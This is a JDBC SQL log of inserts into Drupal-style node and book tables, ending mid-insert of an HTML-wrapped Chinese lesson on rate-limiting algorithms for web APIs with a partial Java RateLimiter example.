|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:03:42.324 INFO  jdbc.sqltiming Line:373 - insert into node__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 8, 8) 
 {executed in 0 msec}
2020-11-19 11:03:42.328 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=8 
 {executed in 0 msec}
2020-11-19 11:03:42.328 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:03:42.329 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 8, 8) 
 {executed in 0 msec}
2020-11-19 11:04:25.762 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='1090590453713254' 
 {executed in 1 msec}
2020-11-19 11:04:25.763 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:04:25.765 INFO  jdbc.sqltiming Line:373 - insert into node_revision (langcode, nid, revision_default, revision_timestamp, revision_uid) 
values ('zh-hans', 0, 1, 1605755065, 1) 
 {executed in 1 msec}
2020-11-19 11:04:25.765 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node_revision (langcode, nid, revision_default, revision_timestamp, 
revision_uid) values ('zh-hans', 0, 1, 1605755065, 1) 
 {executed in 0 msec}
2020-11-19 11:04:25.766 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|9             |
|--------------|

2020-11-19 11:04:25.775 INFO  jdbc.sqltiming Line:373 - insert into node (langcode, type, uuid, vid) values ('zh-hans', 'book', 'b6cce580-69fa-4493-9a12-ac82194cd77d', 
9) 
 {executed in 0 msec}
2020-11-19 11:04:25.776 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node (langcode, type, uuid, vid) values ('zh-hans', 
'book', 'b6cce580-69fa-4493-9a12-ac82194cd77d', 9) 
 {executed in 0 msec}
2020-11-19 11:04:25.776 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|9             |
|--------------|

2020-11-19 11:04:25.781 INFO  jdbc.sqltiming Line:373 - update node_revision set langcode='zh-hans', nid=9, revision_default=1, revision_timestamp=1605755065, 
revision_uid=1 where vid=9 
 {executed in 0 msec}
2020-11-19 11:04:25.788 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_0_, bookfieldf0_.bundle as bundle2_6_0_, bookfieldf0_.delta 
as delta3_6_0_, bookfieldf0_.field_fsid_value as field_fs4_6_0_, bookfieldf0_.langcode as langcode5_6_0_, 
bookfieldf0_.revision_id as revision6_6_0_ from node__field_fsid bookfieldf0_ where bookfieldf0_.entity_id=9 
 {executed in 0 msec}
2020-11-19 11:04:25.789 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:04:25.790 INFO  jdbc.sqltiming Line:373 - insert into node__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, entity_id) 
values ('book', 0, '1090590453713254', 'zh-hans', 9, 9) 
 {executed in 0 msec}
2020-11-19 11:04:25.793 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=9 
 {executed in 0 msec}
2020-11-19 11:04:25.794 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:04:25.795 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, 
entity_id) values ('book', 0, '1090590453713254', 'zh-hans', 9, 9) 
 {executed in 0 msec}
2020-11-19 11:04:25.798 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=9 
 {executed in 0 msec}
2020-11-19 11:04:25.799 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:04:25.800 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_0_, bookentity0_.bid as bid2_1_0_, bookentity0_.depth as 
depth3_1_0_, bookentity0_.has_children as has_chil4_1_0_, bookentity0_.p1 as p5_1_0_, bookentity0_.p2 
as p6_1_0_, bookentity0_.p3 as p7_1_0_, bookentity0_.p4 as p8_1_0_, bookentity0_.p5 as p9_1_0_, 
bookentity0_.pid as pid10_1_0_, bookentity0_.weight as weight11_1_0_ from book bookentity0_ 
where bookentity0_.nid=9 
 {executed in 1 msec}
2020-11-19 11:04:25.800 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:04:25.802 INFO  jdbc.sqltiming Line:373 - insert into book (bid, depth, has_children, p1, p2, p3, p4, p5, pid, weight, nid) values (1, 
3, 0, 1, 4, 9, 0, 0, 4, 0, 9) 
 {executed in 0 msec}
2020-11-19 11:04:25.805 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=9 
 {executed in 0 msec}
2020-11-19 11:04:25.805 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:04:25.806 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=9 
 {executed in 0 msec}
2020-11-19 11:04:25.807 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:04:25.824 INFO  jdbc.sqltiming Line:373 - insert into node_revision__body (body_value, body_summary, bundle, delta, body_format, langcode, 
revision_id, entity_id) values ('<div data-slate-editor="true" data-key="1855" autocorrect="off" 
spellcheck="false" data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: 
break-word;"> <div class="se-8f95813a " data-slate-type="paragraph" data-slate-object="block" 
data-key="1856"> <span data-slate-object="text" data-key="1857"><span data-slate-leaf="true" 
data-offset-key="1857:0" data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> 
</div> <div class="se-4bf17448 " data-slate-type="paragraph" data-slate-object="block" data-key="1858"> 
<span data-slate-object="text" data-key="1859"><span data-slate-leaf="true" data-offset-key="1859:0" 
data-first-offset="true"><span data-slate-string="true">在本专栏中，我们已经接触到了全栈开发中的一些算法了。在这一讲和下一讲中，我又精心挑选了几个比较重要的。</span></span></span><span 
data-slate-object="text" data-key="1860"><span data-slate-leaf="true" data-offset-key="1860:0" 
data-first-offset="true"><span class="se-fec8eccc" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">和单纯地从数学角度去介绍算法不同，我想结合几个全栈开发中实际、典型的问题场景，向你介绍这几个相关的重要算法。</span></span></span></span><span 
data-slate-object="text" data-key="1861"><span data-slate-leaf="true" data-offset-key="1861:0" 
data-first-offset="true"><span data-slate-string="true">毕竟，我们关心的算法，其实就是可以解决实际问题的方法的一种数学抽象。</span></span></span> 
</div> <div class="se-0dbd0ef1 " data-slate-type="paragraph" data-slate-object="block" data-key="1862"> 
<span data-slate-object="text" data-key="1863"><span data-slate-leaf="true" data-offset-key="1863:0" 
data-first-offset="true"><span data-slate-string="true">希望通过这两讲的学习，你能理解这些算法。除了理解算法原理本身，我们更要抓住它们的用途和算法自身的巧妙之处。今天我们来讲其中的第一个典型的问题场景——流量控制。</span></span></span> 
</div> <h2 class="se-54988093" data-slate-type="heading" data-slate-object="block" data-key="1864"><span 
data-slate-object="text" data-key="1865"><span data-slate-leaf="true" data-offset-key="1865:0" 
data-first-offset="true"><span data-slate-string="true">流量控制系统中的算法</span></span></span></h2> 
<div class="se-78995500 " data-slate-type="paragraph" data-slate-object="block" data-key="1866"> 
<span data-slate-object="text" data-key="1867"><span data-slate-leaf="true" data-offset-key="1867:0" 
data-first-offset="true"><span data-slate-string="true">对于全栈工程师来说，无论是网站，还是其它 Web 应用，一旦对外商用，就要考虑流量控制的问题。因此我们往往需要设计使用单独的流量控制模块，我们来看下面这样的一个问题。</span></span></span> 
</div> <div class="se-a3b5b4af " data-slate-type="paragraph" data-slate-object="block" data-key="1868"> 
<span data-slate-object="text" data-key="1869"><span data-slate-leaf="true" data-offset-key="1869:0" 
data-first-offset="true"><span data-slate-string="true">假如说，我们现在需要给一组 Web API 设计一个流量控制系统，以避免请求对系统的过度冲击，对于任意一个用户账户 
ID，每一个 API 都要满足下面所有的要求：</span></span></span> </div> <div class="se-5e6b8dfc" data-slate-type="list" 
data-slate-object="block" data-key="1870"> <div class="se-f3713a99 se-b34d2f88" data-slate-type="list-line" 
data-slate-object="block" data-key="1871"> <span data-slate-object="text" data-key="1872"><span 
data-slate-leaf="true" data-offset-key="1872:0" data-first-offset="true"><span data-slate-string="true">每分钟调用不能超过一万次；</span></span></span> 
</div> <div class="se-a67fc0eb se-6664ca31" data-slate-type="list-line" data-slate-object="block" 
data-key="1873"> <span data-slate-object="text" data-key="1874"><span data-slate-leaf="true" 
data-offset-key="1874:0" data-first-offset="true"><span data-slate-string="true">每小时调用不能超过十万次；</span></span></span> 
</div> <div class="se-e5a001e6 se-419c8ebe" data-slate-type="list-line" data-slate-object="block" 
data-key="1875"> <span data-slate-object="text" data-key="1876"><span data-slate-leaf="true" 
data-offset-key="1876:0" data-first-offset="true"><span data-slate-string="true">每天调用不能超过一百万次；</span></span></span> 
</div> <div class="se-4e1288fd se-ddf8b231" data-slate-type="list-line" data-slate-object="block" 
data-key="1877"> <span data-slate-object="text" data-key="1878"><span data-slate-leaf="true" 
data-offset-key="1878:0" data-first-offset="true"><span data-slate-string="true">每周调用不能超过一千万次；</span></span></span> 
</div> <div class="se-85f3a86f se-f74ffe58" data-slate-type="list-line" data-slate-object="block" 
data-key="1879"> <span data-slate-object="text" data-key="1880"><span data-slate-leaf="true" 
data-offset-key="1880:0" data-first-offset="true"><span data-slate-string="true">……</span></span></span> 
</div> </div> <div class="se-ee07efc9 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1881"> <span data-slate-object="text" data-key="1882"><span data-slate-leaf="true" 
data-offset-key="1882:0" data-first-offset="true"><span data-slate-string="true">在继续往下阅读之前，请你先从算法和数据结构的角度思考，你觉得该怎么设计这个流量控制系统呢？</span></span></span> 
</div> <h3 class="se-0fde4b38" data-slate-type="heading" data-slate-object="block" data-key="1883"><span 
data-slate-object="text" data-key="1884"><span data-slate-leaf="true" data-offset-key="1884:0" 
data-first-offset="true"><span data-slate-string="true">简化问题</span></span></span></h3> <div 
class="se-65ccc5cc " data-slate-type="paragraph" data-slate-object="block" data-key="1885"> 
<span data-slate-object="text" data-key="1886"><span data-slate-leaf="true" data-offset-key="1886:0" 
data-first-offset="true"><span data-slate-string="true">在解决实际问题的时候，我们面临的问题往往是复杂的、多样的，因此，我们可以</span></span></span><span 
data-slate-object="text" data-key="1887"><span data-slate-leaf="true" data-offset-key="1887:0" 
data-first-offset="true"><span class="se-907e09b4" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">考虑能不能先简化问题，再来尝试映射到某一个数学模型上。那些先不考虑的复杂条件，有的可能就是可以忽略掉的，而有的则是为了思路的清晰。一开始我们可以先忽略，有了解题的方法原型以后，再逐步加回来考虑。</span></span></span></span> 
</div> <div class="se-f7e4bc12 " data-slate-type="paragraph" data-slate-object="block" data-key="1888"> 
<span data-slate-object="text" data-key="1889"><span data-slate-leaf="true" data-offset-key="1889:0" 
data-first-offset="true"><span data-slate-string="true">那就这个问题而言，我可以做如下的简化：</span></span></span> 
</div> <div class="se-356546b1" data-slate-type="list" data-slate-object="block" data-key="1890"> 
<div class="se-380c31f4 se-4d0590d6" data-slate-type="list-line" data-slate-object="block" 
data-key="1891"> <span data-slate-object="text" data-key="1892"><span data-slate-leaf="true" 
data-offset-key="1892:0" data-first-offset="true"><span data-slate-string="true">有大量的用户账户 ID，但是我们现在只考虑某一个特定的账户 
ID，反正其它账户 ID 的做法也是一样的；</span></span></span> </div> <div class="se-316512c5 se-883001b8" data-slate-type="list-line" 
data-slate-object="block" data-key="1893"> <span data-slate-object="text" data-key="1894"><span 
data-slate-leaf="true" data-offset-key="1894:0" data-first-offset="true"><span data-slate-string="true">这里面有多个 
Web API，但是我们可以只考虑其中特定的一个 API，反正其它 API 也是类似的；</span></span></span> </div> <div class="se-d3f5814e 
se-c70a7d26" data-slate-type="list-line" data-slate-object="block" data-key="1895"> <span data-slate-object="text" 
data-key="1896"><span data-slate-leaf="true" data-offset-key="1896:0" data-first-offset="true"><span 
data-slate-string="true">这里面有多条规则，但是我们可以只考虑其中的一个规则，即“每分钟调用不能超过一万次”，至于其它的规则，原理上也是一样的。</span></span></span> 
</div> <div class="se-112d130b se-ca89444e" data-slate-type="list-line" data-slate-object="block" 
data-key="1897"> <span data-slate-object="text" data-key="1898"><span data-slate-leaf="true" 
data-offset-key="1898:0" data-first-offset="true"><span data-slate-string="true">为了简化问题，在这里我们也暂不考虑并发、分布式、线程安全等问题。</span></span></span> 
</div> </div> <div class="se-00f143e9 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1899"> <span data-slate-object="text" data-key="1900"><span data-slate-leaf="true" 
data-offset-key="1900:0" data-first-offset="true"><span data-slate-string="true">好，现在问题就简单多了，当我们把这个简化了的问题解决了之后，我们再引入多个用户 
ID、多个 API 和多条规则这样的维度：</span></span></span> </div> <div class="se-5af20635 se-77dcd43c" data-slate-type="pre" 
data-slate-object="block" data-key="1901" data-code-language="java"> <div class="se-d94b0d17 
se-fcf81977"> <span></span> </div> <div class="se-37f8116a"> <div class="se-7b4df96d se-ccb6aadc" 
data-code-line-number="1"></div> <div class="se-7b4df96d se-ccb6aadc" data-code-line-number="2"></div> 
<div class="se-7b4df96d se-ccb6aadc" data-code-line-number="3"></div> <div class="se-7b4df96d 
se-ccb6aadc" data-code-line-number="4"></div> <div class="se-7b4df96d se-ccb6aadc" data-code-line-number="5"></div> 
</div> <div class="se-5d81608a ps ps--active-x"> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="1902"> <span data-slate-object="text" data-key="1903"><span 
data-slate-leaf="true" data-offset-key="1903:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_7683194830" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span><span data-slate-leaf="true" data-offset-key="1903:1"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1903:2"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_4584959419" data-annotation-type="annotation"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_8230784985" 
data-annotation-type="annotation"><span data-slate-string="true">class</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1903:3"><span class=" gkhl-class" data-slate-object="annotation" 
data-annotation-key="gkann_4584959419" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1903:4"><span class=" gkhl-class" 
data-slate-object="annotation" data-annotation-key="gkann_4584959419" data-annotation-type="annotation"><span 
class=" gkhl-title" data-slate-object="annotation" data-annotation-key="gkann_6113287498" data-annotation-type="annotation"><span 
data-slate-string="true">RateLimiter</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1903:5"><span class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_4584959419" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1903:6"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1904"> <span data-slate-object="text" data-key="1905"><span data-slate-leaf="true" 
data-offset-key="1905:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1905:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5715836843" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_4891483213" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1905:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5715836843" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1905:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4692161611" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_5715836843" data-annotation-type="annotation"><span 
data-slate-string="true">boolean</span></span></span></span><span data-slate-leaf="true" data-offset-key="1905:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5715836843" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1905:5"><span class=" gkhl-title" data-slate-object="annotation" 
data-annotation-key="gkann_1218689301" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_5715836843" data-annotation-type="annotation"><span 
data-slate-string="true">isAllowed</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1905:6"><span class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5715836843" 
data-annotation-type="annotation"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_4735237012" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1905:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5715836843" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1905:8"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1906"> <span data-slate-object="text" data-key="1907"><span data-slate-leaf="true" 
data-offset-key="1907:0" data-first-offset="true"><span data-slate-string="true"> ... </span></span><span 
data-slate-leaf="true" data-offset-key="1907:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_6776257374" data-annotation-type="annotation"><span data-slate-string="true">// 
当每分钟调用不超过 10000 次，就返回 true，否则返回 false</span></span></span></span> </div> <div class="se-d15b7025 
se-7e1f828d" data-slate-type="code-line" data-slate-object="block" data-key="1908"> <span data-slate-object="text" 
data-key="1909"><span data-slate-leaf="true" data-offset-key="1909:0" data-first-offset="true"><span 
data-slate-string="true"> }</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1910"> <span data-slate-object="text" 
data-key="1911"><span data-slate-leaf="true" data-offset-key="1911:0" data-first-offset="true"><span 
data-slate-string="true">}</span></span></span> </div> <div class="ps__rail-x" style="width: 
365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 
264px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div class="ps__thumb-y" 
tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> <h3 class="se-cb6a3e7b" 
data-slate-type="heading" data-slate-object="block" data-key="1912"><span data-slate-object="text" 
data-key="1913"><span data-slate-leaf="true" data-offset-key="1913:0" data-first-offset="true"><span 
data-slate-string="true">简单计数</span></span></span></h3> <div class="se-c28fdef5 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1914"> <span data-slate-object="text" data-key="1915"><span 
data-slate-leaf="true" data-offset-key="1915:0" data-first-offset="true"><span data-slate-string="true">好，最先进入脑海的是采用简单计数的办法，我们给 
RateLimiter 一个起始时间的时间戳。如果当前时间在距离起始时间一分钟以内，我们就看当前已经放进来了多少个请求，如果是 10000 个以内，就允许访问，否则就拒绝访问；如果当前时间已经超过了起始时间一分钟，就更新时间戳，并清零计数器。参考代码如下：</span></span></span> 
</div> <div class="se-6171afa3 se-2ea7c662" data-slate-type="pre" data-slate-object="block" 
data-key="1916" data-code-language="java"> <div class="se-fae4f454 se-8fc7cacf"> <span></span> 
</div> <div class="se-38a871cb"> <div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="1"></div> 
<div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="2"></div> <div class="se-a9a7fac0 
se-a6c0cf8a" data-code-line-number="3"></div> <div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="4"></div> 
<div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="5"></div> <div class="se-a9a7fac0 
se-a6c0cf8a" data-code-line-number="6"></div> <div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="7"></div> 
<div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="8"></div> <div class="se-a9a7fac0 
se-a6c0cf8a" data-code-line-number="9"></div> <div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="10"></div> 
<div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="11"></div> <div class="se-a9a7fac0 
se-a6c0cf8a" data-code-line-number="12"></div> <div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="13"></div> 
<div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="14"></div> <div class="se-a9a7fac0 
se-a6c0cf8a" data-code-line-number="15"></div> <div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="16"></div> 
<div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="17"></div> <div class="se-a9a7fac0 
se-a6c0cf8a" data-code-line-number="18"></div> </div> <div class="se-74d6c200 ps ps--active-x"> 
<div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1917"> <span data-slate-object="text" data-key="1918"><span data-slate-leaf="true" 
data-offset-key="1918:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3322259919" data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span><span 
data-slate-leaf="true" data-offset-key="1918:1"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1918:2"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1987164721" data-annotation-type="annotation"><span class=" gkhl-class" 
data-slate-object="annotation" data-annotation-key="gkann_5027682364" data-annotation-type="annotation"><span 
data-slate-string="true">class</span></span></span></span><span data-slate-leaf="true" data-offset-key="1918:3"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_5027682364" data-annotation-type="annotation"><span 
data-slate-string="true"> </span></span></span><span data-slate-leaf="true" data-offset-key="1918:4"><span 
class=" gkhl-title" data-slate-object="annotation" data-annotation-key="gkann_3748444133" data-annotation-type="annotation"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_5027682364" data-annotation-type="annotation"><span 
data-slate-string="true">RateLimiter</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1918:5"><span class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_5027682364" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1918:6"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1919"> <span data-slate-object="text" data-key="1920"><span data-slate-leaf="true" 
data-offset-key="1920:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1920:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9791526735" data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="1920:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1920:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7653190876" data-annotation-type="annotation"><span data-slate-string="true">long</span></span></span><span 
data-slate-leaf="true" data-offset-key="1920:4"><span data-slate-string="true"> start = System.currentTimeMillis();</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1921"> <span data-slate-object="text" data-key="1922"><span data-slate-leaf="true" 
data-offset-key="1922:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1922:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1017950532" data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="1922:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1922:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2556371799" data-annotation-type="annotation"><span data-slate-string="true">int</span></span></span><span 
data-slate-leaf="true" data-offset-key="1922:4"><span data-slate-string="true"> count = </span></span><span 
data-slate-leaf="true" data-offset-key="1922:5"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6056750481" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="1922:6"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1923"> <span data-slate-object="text" data-key="1924"><span data-slate-leaf="true" 
data-offset-key="1924:0" data-first-offset="true"><span data-slate-string="true"> </span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1925"> <span data-slate-object="text" data-key="1926"><span data-slate-leaf="true" 
data-offset-key="1926:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1926:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7479332847" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_4534195230" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1926:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_4534195230" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1926:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
